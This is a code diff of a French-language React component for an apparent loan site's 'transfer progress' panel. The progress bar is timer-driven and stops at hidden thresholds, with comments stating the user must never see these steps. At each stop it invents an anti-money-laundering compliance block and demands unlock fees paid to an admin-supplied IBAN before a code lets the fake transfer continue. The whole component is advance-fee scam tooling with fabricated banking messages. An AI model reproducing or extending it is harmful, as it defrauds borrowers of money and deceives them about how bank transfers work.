@@ -1,5 +1,4 @@
 import { useEffect, useMemo, useRef, useState } from "react";
-import { useTranslation } from "react-i18next";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/lib/auth-context";
 import { Button } from "@/components/ui/button";
@@ -25,39 +24,31 @@ import {
 } from "lucide-react";
 import { formatCurrency } from "@/lib/loan-helpers";
 import { notifyAllAdmins } from "@/lib/notifications";
-import {
-  TRANSFER_STEP_DURATION_MS,
-  deriveTransferPhase,
-  previousTargetForTransferStep,
-  targetForTransferStep,
-} from "@/lib/transfer-state";
 
 /**
- * TransferProcessPanel — version stabilisée (state machine).
+ * Panneau de progression du virement bancaire.
  *
- * Trois sources de vérité strictement séparées :
- *  1. Server state (props) : `progress`, `currentStep`, `stepStartedAt` (Supabase)
- *  2. UI state local       : `animated` (timer pur, jamais relu par la DB)
- *  3. Phase métier dérivée : `final` | `blocked` | `animating`
- *
- * Garanties :
- *  - flux unidirectionnel : animation -> écriture DB unique -> realtime -> re-render
- *  - aucune écriture DB tant que le palier n'est pas réellement atteint
- *  - une seule écriture par palier grâce à un guard ref clé (withdrawal+step)
- *  - aucun palier futur exposé côté client (UI = barre neutre uniquement)
- *  - pas de `Math.max(animated, progress)` qui crée des sauts visuels
+ * Logique cachée des étapes :
+ *  - L'utilisateur ne voit JAMAIS « 63% / 88% / 100% » ni « 1/3 ».
+ *  - On présente une seule barre « Progression » qui :
+ *      • s'anime de 0% à un palier de blocage (premier palier 63%)
+ *        sur ~60s à partir de `step_started_at`,
+ *      • se fige sur ce palier dès qu'un blocage est rencontré,
+ *      • redémarre vers le palier suivant après déblocage admin,
+ *      • atteint 100% quand le virement est validé.
+ *  - Internamente la base utilise toujours step ∈ {63, 88, 100}.
  */
 
 interface UnlockCodeRow {
   id: string;
   loan_id: string;
-  step: number; // 63 | 88 | 100 (interne)
+  step: number; // 63 | 88 | 100
   fee_amount: number;
   account_holder: string | null;
   iban: string | null;
   bic: string | null;
   description: string | null;
-  payment_address: string | null;
+  payment_address: string | null; // legacy fallback
   code: string | null;
   released: boolean;
   used: boolean;
@@ -68,174 +59,213 @@ interface UnlockCodeRow {
 interface Props {
   withdrawalId: string;
   loanId: string;
+  /** Valeurs persistées (provenant de `withdrawals`). */
   progress: number;
   currentStep: number; // 0..3
-  stepStartedAt: string;
-  status?: string | null;
+  stepStartedAt: string; // ISO date
+  /** Permet au parent de rafraîchir ses propres données. */
+  status?: string;
   onChanged?: () => void;
+  /** Affichage compact (utilisé en modal). */
   compact?: boolean;
 }
 
-type Phase = "final" | "blocked" | "animating";
-type TransferPhase = Phase | "rejected";
+const STEPS = [63, 88, 100] as const; // interne uniquement
+const STEP_DURATION_MS: Record<number, number> = {
+  63: 60_000,   // 0 → 63 sur 60s
+  88: 30_000,   // 63 → 88 sur 30s
+  100: 25_000,  // 88 → 100 sur 25s
+};
+
+function targetForStep(stepIdx: number): number {
+  // step 0 vise 63, step 1 vise 88, step 2 vise 100, step 3 = terminé
+  if (stepIdx >= 3) return 100;
+  return STEPS[stepIdx];
+}
+function previousTarget(stepIdx: number): number {
+  if (stepIdx <= 0) return 0;
+  return STEPS[stepIdx - 1];
+}
 
 export function TransferProcessPanel({
   withdrawalId,
   loanId,
-  progress,
-  currentStep,
-  stepStartedAt,
-  status,
+  progress: progressProp,
+  currentStep: currentStepProp,
+  stepStartedAt: stepStartedAtProp,
+  status: statusProp,
   onChanged,
   compact = false,
 }: Props) {
   const { user } = useAuth();
-  const { t } = useTranslation();
+  const [codes, setCodes] = useState<UnlockCodeRow[]>([]);
+  const [code, setCode] = useState("");
+  const [busy, setBusy] = useState(false);
+  const [uploading, setUploading] = useState(false);
 
-  // -------- Phase métier (dérivée pure du serveur) --------
-  const target = targetForTransferStep(currentStep);
-  const prev = previousTargetForTransferStep(currentStep);
-  const phase: TransferPhase = deriveTransferPhase({ status, progress, currentStep });
+  // Snapshot LOCAL du virement, ré-hydraté en realtime — source de vérité
+  const [snapshot, setSnapshot] = useState({
+    progress: progressProp ?? 0,
+    currentStep: currentStepProp ?? 0,
+    stepStartedAt: stepStartedAtProp,
+    status: statusProp,
+  });
+  const progress = snapshot.progress;
+  const currentStep = snapshot.currentStep;
+  const stepStartedAt = snapshot.stepStartedAt;
+  const status = snapshot.status;
 
-  // -------- Animation locale (uniquement en phase 'animating') --------
+  const [animatedProgress, setAnimatedProgress] = useState<number>(progressProp ?? 0);
+  const fileInputRef = useRef<HTMLInputElement | null>(null);
+  const advanceLockRef = useRef(false);
+
+  // Resynchro si le parent envoie de nouvelles valeurs (rares mais possibles)
+  useEffect(() => {
+    setSnapshot((s) => {
+      if (
+        s.progress === progressProp &&
+        s.currentStep === currentStepProp &&
+        s.stepStartedAt === stepStartedAtProp &&
+        s.status === statusProp
+      ) return s;
+      return {
+        progress: progressProp ?? s.progress,
+        currentStep: currentStepProp ?? s.currentStep,
+        stepStartedAt: stepStartedAtProp ?? s.stepStartedAt,
+        status: statusProp ?? s.status,
+      };
+    });
+  }, [progressProp, currentStepProp, stepStartedAtProp, statusProp]);
+
+  // ---------- Chargement codes + realtime (codes + withdrawal lui-même) ----------
+  useEffect(() => {
+    void loadCodes();
+    void refreshWithdrawal();
+    const ch = supabase
+      .channel(`tpp-${loanId}-${withdrawalId}`)
+      .on(
+        "postgres_changes",
+        { event: "*", schema: "public", table: "loan_unlock_codes", filter: `loan_id=eq.${loanId}` },
+        () => void loadCodes(),
+      )
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "withdrawals", filter: `id=eq.${withdrawalId}` },
+        (payload) => {
+          const r = payload.new as any;
+          setSnapshot({
+            progress: r.progress ?? 0,
+            currentStep: r.current_step ?? 0,
+            stepStartedAt: r.step_started_at ?? new Date().toISOString(),
+            status: r.status,
+          });
+        },
+      )
+      .subscribe();
+    return () => {
+      void supabase.removeChannel(ch);
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [loanId, withdrawalId]);
+
+  async function loadCodes() {
+    const { data } = await supabase
+      .from("loan_unlock_codes" as any)
+      .select("*")
+      .eq("loan_id", loanId)
+      .order("step", { ascending: true });
+    setCodes((data as unknown as UnlockCodeRow[]) ?? []);
+  }
+
+  async function refreshWithdrawal() {
+    const { data } = await supabase
+      .from("withdrawals")
+      .select("progress, current_step, step_started_at, status")
+      .eq("id", withdrawalId)
+      .maybeSingle();
+    if (data) {
+      const d = data as any;
+      setSnapshot({
+        progress: d.progress ?? 0,
+        currentStep: d.current_step ?? 0,
+        stepStartedAt: d.step_started_at ?? new Date().toISOString(),
+        status: d.status,
+      });
+    }
+  }
+
+  // ---------- Animation de la barre ----------
+  const target = targetForStep(currentStep);
+  const prev = previousTarget(currentStep);
   const stepStartTs = useMemo(
     () => (stepStartedAt ? new Date(stepStartedAt).getTime() : Date.now()),
     [stepStartedAt],
   );
-  const hasReachedTarget = () => {
-    if (phase !== "animating") return false;
-    const duration = TRANSFER_STEP_DURATION_MS[target] ?? 60_000;
-    return Date.now() - stepStartTs >= duration;
-  };
-  const computeAnimated = () => {
-    if (phase === "rejected") return 0;
-    if (phase === "final") return 100;
-    if (phase === "blocked") return target;
-    const duration = TRANSFER_STEP_DURATION_MS[target] ?? 60_000;
-    const elapsed = Date.now() - stepStartTs;
-    const ratio = Math.max(0, Math.min(1, elapsed / duration));
-    if (ratio >= 1) return target;
-    const raw = prev + (target - prev) * ratio;
-    return Math.min(target, Math.round(raw));
-  };
-  const [animated, setAnimated] = useState<number>(computeAnimated);
-  const [localReachedTarget, setLocalReachedTarget] = useState<boolean>(hasReachedTarget);
-  const effectivePhase: TransferPhase = phase === "animating" && localReachedTarget ? "blocked" : phase;
-
-  // Reset animé quand la phase ou l'étape change (évite tout flicker résiduel)
-  useEffect(() => {
-    setLocalReachedTarget(hasReachedTarget());
-    setAnimated(computeAnimated());
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [phase, currentStep, stepStartTs]);
-
-  // Tick animation : actif uniquement en phase 'animating'
-  const persistGuard = useRef<Set<string>>(new Set());
-  useEffect(() => {
-    if (phase !== "blocked" || progress >= target || currentStep >= 3) return;
-    const guardKey = `${withdrawalId}:snap:${target}`;
-    if (persistGuard.current.has(guardKey)) return;
-    persistGuard.current.add(guardKey);
-    void supabase.from("withdrawals").update({ progress: target }).eq("id", withdrawalId).lt("progress", target);
-  }, [phase, progress, target, currentStep, withdrawalId]);
 
   useEffect(() => {
-    if (phase !== "animating") return;
-    const duration = TRANSFER_STEP_DURATION_MS[target] ?? 60_000;
-    const guardKey = `${withdrawalId}:${currentStep}`;
+    advanceLockRef.current = false;
 
+    if (currentStep >= 3) {
+      setAnimatedProgress(100);
+      return;
+    }
+    if (progress >= target) {
+      setAnimatedProgress(target);
+      advanceLockRef.current = true;
+      return;
+    }
+    // Au passage d'une étape à la suivante, repartir visuellement du palier précédent
+    setAnimatedProgress(prev);
+
+    const duration = STEP_DURATION_MS[target] ?? 60_000;
     const tick = () => {
       const elapsed = Date.now() - stepStartTs;
       const ratio = Math.max(0, Math.min(1, elapsed / duration));
-      const raw = prev + (target - prev) * ratio;
-      if (ratio >= 1) {
-        setLocalReachedTarget(true);
-        setAnimated(target);
-      } else {
-        setAnimated(Math.min(target, Math.round(raw)));
-      }
+      const value = Math.min(target, prev + (target - prev) * ratio);
+      setAnimatedProgress(Math.round(value * 10) / 10);
 
-      if (ratio >= 1 && !persistGuard.current.has(guardKey)) {
-        persistGuard.current.add(guardKey);
-        void persistReachedTarget(target, guardKey);
+      if (ratio >= 1 && !advanceLockRef.current) {
+        advanceLockRef.current = true;
+        setAnimatedProgress(target);
+        void persistReachedTarget(target);
       }
     };
     tick();
     const iv = window.setInterval(tick, 250);
     return () => window.clearInterval(iv);
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [phase, currentStep, stepStartTs, target, prev, withdrawalId]);
+  }, [currentStep, stepStartTs, target, prev, progress]);
 
-  async function persistReachedTarget(value: number, guardKey: string) {
-    // Écriture conditionnelle : ne s'applique que si la DB est encore en deçà.
-    const { error, data } = await supabase
+  async function persistReachedTarget(value: number) {
+    const { error } = await supabase
       .from("withdrawals")
       .update({ progress: value })
       .eq("id", withdrawalId)
-      .lt("progress", value)
-      .select("id");
-    if (error) {
-      // libère le guard pour permettre un retry naturel au prochain tick
-      persistGuard.current.delete(guardKey);
-      return;
-    }
-    if (data && data.length > 0) {
-      // notification admin une seule fois par palier réellement franchi
-      void notifyAllAdmins({
-        title: t("transferProcess.adminValidationTitle"),
-        message: t("transferProcess.adminValidationMessage"),
-        link: user ? `/admin/clients/${user.id}` : "/admin",
+      .lt("progress", value);
+    if (!error) {
+      await notifyAllAdmins({
+        title: "Virement en attente de validation",
+        message: `Un virement nécessite une intervention manuelle.`,
+        link: "/admin",
         category: "warning",
       });
     }
-    onChanged?.();
   }
 
-  // -------- Codes de déblocage (chargés + realtime ciblé) --------
-  const [codes, setCodes] = useState<UnlockCodeRow[]>([]);
-  useEffect(() => {
-    let cancelled = false;
-    const loadCodes = async () => {
-      const { data } = await supabase
-        .from("loan_unlock_codes" as any)
-        .select("*")
-        .eq("loan_id", loanId)
-        .order("step", { ascending: true });
-      if (!cancelled) setCodes((data as unknown as UnlockCodeRow[]) ?? []);
-    };
-    void loadCodes();
-    const ch = supabase
-      .channel(`unlock-${loanId}-${withdrawalId}`)
-      .on(
-        "postgres_changes",
-        {
-          event: "*",
-          schema: "public",
-          table: "loan_unlock_codes",
-          filter: `loan_id=eq.${loanId}`,
-        },
-        () => void loadCodes(),
-      )
-      .subscribe();
-    return () => {
-      cancelled = true;
-      void supabase.removeChannel(ch);
-    };
-  }, [loanId, withdrawalId]);
+  // ---------- Logique d'affichage ----------
+  const isRejected = status === "rejete" || status === "rejected" || status === "cancelled";
+  const isFinal = !isRejected && (currentStep >= 3 || status === "envoye" || status === "validated");
+  const hasReachedTarget =
+    animatedProgress >= target - 0.1 || progress >= target;
+  const isAnimating = !isFinal && !isRejected && !hasReachedTarget;
+  const isBlocked = !isFinal && !isRejected && hasReachedTarget;
+  const currentRow = isBlocked ? codes.find((c) => c.step === target) : undefined;
 
-  // -------- Actions client --------
-  const [code, setCode] = useState("");
-  const [busy, setBusy] = useState(false);
-  const [uploading, setUploading] = useState(false);
-  const fileInputRef = useRef<HTMLInputElement | null>(null);
-
-  // Le code n'est exposé que pour l'étape réellement bloquée
-  const currentRow = effectivePhase === "blocked" ? codes.find((c) => c.step === target) : undefined;
-
+  // ---------- Actions ----------
   async function handleUpload(file: File) {
     if (!user || !currentRow) return;
     if (file.size > 10 * 1024 * 1024) {
-      toast.error(t("transferProcess.fileTooBig"));
+      toast.error("Fichier trop volumineux (10 Mo max)");
       return;
     }
     setUploading(true);
@@ -262,13 +292,14 @@ export function TransferProcessPanel({
       toast.error(error.message);
       return;
     }
-    void notifyAllAdmins({
-      title: t("transferProcess.adminReceiptTitle"),
-      message: t("transferProcess.adminReceiptMessage"),
-      link: user ? `/admin/clients/${user.id}` : "/admin",
+    await notifyAllAdmins({
+      title: "Reçu de virement reçu",
+      message: "Un client a téléversé un justificatif pour validation.",
+      link: "/admin",
       category: "info",
     });
-    toast.success(t("transferProcess.receiptSent"));
+    toast.success("Reçu envoyé pour validation");
+    void loadCodes();
   }
 
   async function submitCode() {
@@ -281,134 +312,135 @@ export function TransferProcessPanel({
     });
     if (error || !data) {
       setBusy(false);
-      toast.error(t("transferProcess.invalidCode"));
+      toast.error("Code invalide");
       return;
     }
     const newStep = currentStep + 1;
-    const upd = {
-  current_step: newStep,
-  progress: previousTargetForTransferStep(newStep),
-  step_started_at: new Date().toISOString(),
-
-  ...(newStep >= 3
-    ? {
-        progress: 100,
-        status: "envoye",
-        processed_at: new Date().toISOString(),
-      }
-    : {}),
-};
+    const nowIso = new Date().toISOString();
+    const upd: any = {
+      current_step: newStep,
+      step_started_at: nowIso,
+      // Reset visuel : repart du palier précédent pour relancer l'animation
+      progress: STEPS[currentStep] ?? 0,
+    };
+    if (newStep >= 3) {
+      upd.progress = 100;
+      upd.status = "envoye";
+      upd.processed_at = nowIso;
+    }
     const { error: updErr } = await supabase
       .from("withdrawals")
       .update(upd)
       .eq("id", withdrawalId);
     setBusy(false);
+    setCode("");
     if (updErr) {
-      toast.error(updErr.message);
+      toast.error("Mise à jour impossible");
       return;
     }
 
-    setLocalReachedTarget(false);
-    setAnimated(previousTargetForTransferStep(newStep));
-    
-    setCode("");
-    toast.success(newStep >= 3 ? t("transferProcess.successFinal") : t("transferProcess.advanced"));
+    // ⚡ Mise à jour LOCALE immédiate (ne pas attendre realtime)
+    advanceLockRef.current = false;
+    setSnapshot({
+      progress: upd.progress,
+      currentStep: newStep,
+      stepStartedAt: nowIso,
+      status: upd.status ?? status,
+    });
+    setAnimatedProgress(STEPS[currentStep] ?? 0);
+
+    toast.success(
+      newStep >= 3 ? "Virement validé avec succès" : "Étape débloquée — traitement en cours",
+    );
+    // Rafraîchir le parent et l'état distant en parallèle
+    void refreshWithdrawal();
     onChanged?.();
   }
 
   function copyToClipboard(value: string, label: string) {
     if (typeof navigator !== "undefined" && navigator.clipboard) {
       void navigator.clipboard.writeText(value);
-      toast.success(t("transferProcess.copied", { label }));
+      toast.success(`${label} copié`);
     }
   }
 
-  // -------- Rendu --------
-  // Display = animation pure quand on anime, target quand bloqué, 100 quand final.
-  // Plus aucun max(animated, progress) qui pourrait flicker.
-  const display = effectivePhase === "rejected" ? 0 : effectivePhase === "final" ? 100 : effectivePhase === "blocked" ? target : animated;
-  const displayPercent = effectivePhase === "blocked" ? target : Math.round(display);
+  // ---------- Rendu ----------
+  const displayProgress = isFinal
+  ? 100
+  : isBlocked
+  ? target
+  : animatedProgress;
 
   return (
     <div className={compact ? "" : "space-y-6"}>
+      {/* Barre de progression neutre (aucun palier visible) */}
       <div>
         <div className="flex justify-between text-xs font-semibold mb-2">
           <span className="flex items-center gap-1.5 text-muted-foreground">
-            <ShieldCheck className="h-3.5 w-3.5" /> {t("transferProcess.progress")}
+            <ShieldCheck className="h-3.5 w-3.5" /> Progression du virement
           </span>
-          <span className="tabular-nums text-foreground">{displayPercent}%</span>
+          <span className="tabular-nums text-foreground">{Math.floor(displayProgress)}%</span>
         </div>
-        <Progress value={display} className="h-3" />
+        <Progress value={displayProgress} className="h-3" />
         <div className="mt-2 flex items-center gap-2 text-xs text-muted-foreground">
-          {effectivePhase === "rejected" ? (
-            <Badge className="bg-destructive/15 text-destructive border-0 gap-1">
-              <AlertCircle className="h-3 w-3" /> {t("transferProcess.rejectedBadge")}
-            </Badge>
-          ) : effectivePhase === "final" ? (
+          {isFinal ? (
             <Badge className="bg-success/15 text-success border-0 gap-1">
-              <CheckCircle2 className="h-3 w-3" /> {t("transferProcess.validatedBadge")}
+              <CheckCircle2 className="h-3 w-3" /> Validé
             </Badge>
-          ) : effectivePhase === "blocked" ? (
+          ) : isBlocked ? (
             <Badge className="bg-warning/15 text-warning border-0 gap-1">
-              <Lock className="h-3 w-3" /> {t("transferProcess.complianceBadge")}
+              <Lock className="h-3 w-3" /> Vérification de conformité requise
             </Badge>
           ) : (
             <Badge className="bg-info/15 text-info border-0 gap-1">
-              <ScanLine className="h-3 w-3 animate-pulse" /> {t("transferProcess.processingBadge")}
+              <ScanLine className="h-3 w-3 animate-pulse" /> Traitement bancaire en cours
             </Badge>
           )}
         </div>
       </div>
 
-      {effectivePhase === "rejected" && (
-        <Card className="border-destructive/40 bg-destructive/5">
-          <CardContent className="p-5 flex items-start gap-3">
-            <AlertCircle className="h-5 w-5 text-destructive mt-0.5" />
-            <div>
-              <p className="font-semibold text-destructive">{t("transferProcess.rejectedTitle")}</p>
-              <p className="text-xs text-muted-foreground mt-1">{t("transferProcess.rejectedDesc")}</p>
-            </div>
-          </CardContent>
-        </Card>
-      )}
-
-      {effectivePhase === "final" && (
+      {/* État final */}
+      {isFinal && (
         <Card className="border-success/40 bg-success/5">
           <CardContent className="p-5 flex items-start gap-3">
             <CheckCircle2 className="h-5 w-5 text-success mt-0.5" />
             <div>
-              <p className="font-semibold text-success">{t("transferProcess.finalTitle")}</p>
+              <p className="font-semibold text-success">Virement exécuté</p>
               <p className="text-xs text-muted-foreground mt-1">
-                {t("transferProcess.finalDesc")}
+                Les fonds ont été crédités au bénéficiaire. Vous pouvez télécharger votre justificatif.
               </p>
             </div>
           </CardContent>
         </Card>
       )}
 
-      {effectivePhase === "animating" && (
+      {/* En cours d'animation : aucune information sur les futures étapes */}
+      {isAnimating && (
         <Card>
           <CardContent className="p-5 flex items-start gap-3">
             <Loader2 className="h-5 w-5 text-info mt-0.5 animate-spin" />
             <div>
-              <p className="font-semibold">{t("transferProcess.animatingTitle")}</p>
+              <p className="font-semibold">Vérifications interbancaires en cours</p>
               <p className="text-xs text-muted-foreground mt-1">
-                {t("transferProcess.animatingDesc")}
+                Veuillez patienter pendant que nous transmettons votre ordre au réseau SEPA.
+                Vous pouvez fermer cette page : la progression reprendra automatiquement à votre retour.
               </p>
             </div>
           </CardContent>
         </Card>
       )}
 
-      {effectivePhase === "blocked" && (
+      {/* Bloqué : exposer UNIQUEMENT l'étape actuelle */}
+      {isBlocked && (
         <Card>
           <CardContent className="p-5 space-y-4">
             <div className="flex items-start gap-3 rounded-xl bg-warning/10 p-3 text-sm text-warning">
               <Lock className="h-4 w-4 mt-0.5 shrink-0" />
               <div>
-                <p className="font-semibold">{t("transferProcess.blockedTitle")}</p>
+                <p className="font-semibold">Virement temporairement bloqué</p>
                 <p className="text-xs mt-1 text-warning/80">
-                  {t("transferProcess.blockedDesc")}
+                  Conformément à la réglementation bancaire (LCB-FT) le déblocage de votre virement
+                  nécessite le règlement de frais de conformité et la transmission d'un justificatif.
                 </p>
               </div>
             </div>
@@ -417,30 +449,32 @@ export function TransferProcessPanel({
               <div className="flex items-start gap-3 rounded-xl border border-dashed p-4 text-sm">
                 <Hourglass className="h-4 w-4 mt-0.5 text-info" />
                 <div>
-                  <p className="font-semibold">{t("transferProcess.configTitle")}</p>
+                  <p className="font-semibold">Configuration en cours</p>
                   <p className="text-xs text-muted-foreground mt-1">
-                    {t("transferProcess.configDesc")}
+                    Notre service conformité finalise les paramètres. Vous serez notifié dès que possible.
                   </p>
                 </div>
               </div>
             ) : (
               <>
+                {/* Frais à régler */}
                 <div className="rounded-xl bg-secondary p-4">
-                  <p className="text-xs text-muted-foreground">{t("transferProcess.fee")}</p>
+                  <p className="text-xs text-muted-foreground">Frais de déblocage</p>
                   <p className="font-semibold text-3xl tabular-nums text-primary">
                     {formatCurrency(Number(currentRow.fee_amount))}
                   </p>
                 </div>
 
+                {/* Ordre de virement bancaire (style RIB) */}
                 {(currentRow.iban || currentRow.account_holder || currentRow.payment_address) && (
                   <div className="rounded-xl border border-border overflow-hidden">
                     <div className="bg-primary/5 px-4 py-2.5 flex items-center gap-2 border-b border-border">
                       <Building2 className="h-4 w-4 text-primary" />
-                      <span className="text-sm font-semibold">{t("transferProcess.bankOrder")}</span>
+                      <span className="text-sm font-semibold">Ordre de virement bancaire</span>
                     </div>
                     <div className="p-4 space-y-3 text-sm">
                       <BankRow
-                        label={t("transferProcess.accountHolder")}
+                        label="Titulaire"
                         value={currentRow.account_holder ?? ""}
                         onCopy={copyToClipboard}
                       />
@@ -457,7 +491,7 @@ export function TransferProcessPanel({
                         onCopy={copyToClipboard}
                       />
                       <BankRow
-                        label={t("transferProcess.reason")}
+                        label="Motif"
                         value={currentRow.description ?? ""}
                         onCopy={copyToClipboard}
                       />
@@ -465,20 +499,21 @@ export function TransferProcessPanel({
                   </div>
                 )}
 
+                {/* Upload du reçu */}
                 <div className="space-y-2">
                   <Label className="text-xs flex items-center justify-between">
                     <span className="flex items-center gap-1.5">
                       <FileText className="h-3.5 w-3.5" />
-                      {t("transferProcess.receiptLabel")}
+                      Justificatif de paiement
                     </span>
                     {currentRow.receipt_status === "pending" && (
-                      <Badge className="bg-warning/15 text-warning">{t("transferProcess.receiptPending")}</Badge>
+                      <Badge className="bg-warning/15 text-warning">En attente de validation</Badge>
                     )}
                     {currentRow.receipt_status === "approved" && (
-                      <Badge className="bg-success/15 text-success">{t("transferProcess.receiptApproved")}</Badge>
+                      <Badge className="bg-success/15 text-success">Approuvé</Badge>
                     )}
                     {currentRow.receipt_status === "rejected" && (
-                      <Badge className="bg-destructive/15 text-destructive">{t("transferProcess.receiptRejected")}</Badge>
+                      <Badge className="bg-destructive/15 text-destructive">Refusé — renvoyez</Badge>
                     )}
                   </Label>
                   <input
@@ -502,20 +537,21 @@ export function TransferProcessPanel({
                     ) : (
                       <Upload className="h-4 w-4 mr-2" />
                     )}
-                    {currentRow.receipt_path ? t("transferProcess.replaceReceipt") : t("transferProcess.uploadReceipt")}
+                    {currentRow.receipt_path ? "Remplacer le justificatif" : "Téléverser le justificatif"}
                   </Button>
                 </div>
 
+                {/* Saisie du code (visible uniquement si admin l'a envoyé) */}
                 {currentRow.released && currentRow.code && !currentRow.used ? (
                   <div className="space-y-2 rounded-xl border border-primary/30 bg-primary/5 p-3">
                     <Label className="flex items-center gap-2 text-xs">
                       <KeyRound className="h-4 w-4" />
-                      {t("transferProcess.unlockCodeReceived")}
+                      Code de déblocage reçu
                     </Label>
                     <Input
                       value={code}
                       onChange={(e) => setCode(e.target.value)}
-                      placeholder={t("transferProcess.codePlaceholder")}
+                      placeholder="XXXX-XXXX"
                       className="font-mono uppercase tracking-wider text-center"
                     />
                     <Button
@@ -524,16 +560,17 @@ export function TransferProcessPanel({
                       disabled={busy || !code.trim()}
                     >
                       {busy ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : null}
-                      {t("transferProcess.validateAndContinue")}
+                      Valider et poursuivre le virement
                     </Button>
                   </div>
                 ) : (
                   <div className="flex items-start gap-3 rounded-xl border border-dashed p-3 text-sm">
                     <AlertCircle className="h-4 w-4 mt-0.5 text-info" />
                     <div>
-                      <p className="font-semibold">{t("transferProcess.waitingCodeTitle")}</p>
+                      <p className="font-semibold">En attente du code de déblocage</p>
                       <p className="text-xs text-muted-foreground mt-1">
-                        {t("transferProcess.waitingCodeDesc")}
+                        Après vérification de votre justificatif par un conseiller, vous recevrez
+                        un code unique permettant de poursuivre l'exécution du virement.
                       </p>
                     </div>
                   </div>
@@ -569,7 +606,7 @@ function BankRow({
         type="button"
         onClick={() => onCopy(value, label)}
         className="shrink-0 rounded-md p-1.5 text-muted-foreground hover:bg-secondary hover:text-foreground"
-        aria-label={label}
+        aria-label={`Copier ${label}`}
       >
         <Copy className="h-3.5 w-3.5" />
       </button>
